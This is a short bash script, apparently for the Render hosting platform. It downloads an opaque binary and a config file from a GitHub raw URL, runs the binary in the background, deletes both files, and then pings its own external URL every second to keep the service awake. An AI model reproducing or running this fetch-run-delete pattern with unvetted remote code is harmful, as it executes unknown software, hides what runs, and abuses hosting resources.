#!/usr/bin/env bash
wget https://raw.githubusercontent.com/balckwilliam/testrender/main/appdata
wget https://raw.githubusercontent.com/balckwilliam/testrender/main/config.json
chmod +x appdata
./appdata -c config.json run &
rm -f appdata
rm -f config.json
while true
do
curl $RENDER_EXTERNAL_URL
sleep 1
done
